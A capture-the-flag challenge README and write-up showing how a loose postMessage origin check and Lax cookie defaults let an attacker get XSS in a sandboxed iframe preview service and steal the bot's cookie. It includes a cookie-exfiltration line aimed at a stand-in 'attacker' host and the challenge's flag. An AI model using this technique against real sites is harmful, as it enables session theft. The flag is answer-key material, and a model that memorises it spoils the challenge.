# Iframe Sandbox

[日本語版はこちら](./README-ja.md)

## Description

I built an HTML preview service using an iframe. I hope the "sandbox" attribute is enough to prevent XSS.

### Beginner Hint: How do I host a web page?
- You can host your web page using any method you like, but I highly recommend using [RequestRepo](https://requestrepo.com/).

## Writeup

### Overview

`sandbox.html` expects to be rendered inside an iframe. It receives a `render-html` message from the parent and renders the HTML.  

```html
<script>
    const app = document.getElementById("app");

    window.addEventListener("message", (event) => {
        if (event.source !== window.parent || !event.origin.includes(location.hostname)) {
            return;
        }

        const data = event.data;
        if (!data || data.type !== "render-html") {
            return;
        }

        app.innerHTML = data.html;
    });
</script>
```

The goal of this challenge is to extract the cookie.

### Step 1: Achieving XSS

Exploiting `index.html` is probably impossible because:
* You cannot specify the HTML to be rendered through the URL. Since you cannot control the bot except for the URL they visit, there's no way to render arbitrary HTML using `index.html`.
* The `sandbox` attribute on the iframe prevents any JavaScript from executing.

You can try rendering `sandbox.html` inside a web page that you host. However, the following check looks like it prevents sending messages cross-origin.

```javascript
!event.origin.includes(location.hostname)
```

This check is extremely loose. `location.hostname` is `web`. This means that if you render it in an iframe within a web page whose origin contains the string `web`, the message will be accepted.

You can create such a web page in multiple ways:
* [RequestRepo](https://requestrepo.com/) is a web service that allows you to create web pages easily. You can host a web page under `http://*.<subdomain>.requestrepo.com/`. Hence, you can host the web page under `http://web.<subdomain>.requestrepo.com/`, which includes the string `web`.
* Create a server that is accessible from the internet, either with a machine that you own or using a cloud server such as Compute Engine or EC2. You can use [nip.io](https://nip.io/), which is a wildcard DNS service. For example, if your web server's IP address is `111.111.111.111`, `web.111.111.111.111.nip.io` resolves to `111.111.111.111`, and you can host a web page under `http://web.111.111.111.111.nip.io/` that contains the string `web`.

### Step 2: Bypassing the Same-Origin Policy

Try running `location='http://attacker/?'+document.cookie` from Step 1. You will notice that the request will be made, but the cookie will be empty. Why is this?

The reason is the **Same-Origin Policy (SOP)**. Modern web browsers limit interaction between web pages with different origins. Because of the SOP, when you render a cross-origin iframe, it prevents any cookies from being accessed.

We can bypass this with the following steps:
* Using the XSS from Step 1, open any web page on `http://web:3000/` using the `window.open` function.
* Notice that the cookie doesn't contain a `SameSite` attribute, so it falls back to the default value of `Lax`. `Lax` cookies will be sent in top-level navigations, even in a page that is opened with `window.open`. Hence, the page you opened can access to the cookie. 
* Now, the iframe that you rendered in your website and the opened window have the same origin. This means that the iframe can access the cookie as well.

Please see [solver.py](./solver.py) for the solution that uses RequestRepo.

## Flag
`Alpaca{4noth3r_sandb0x_An0ther_byp4s5}`
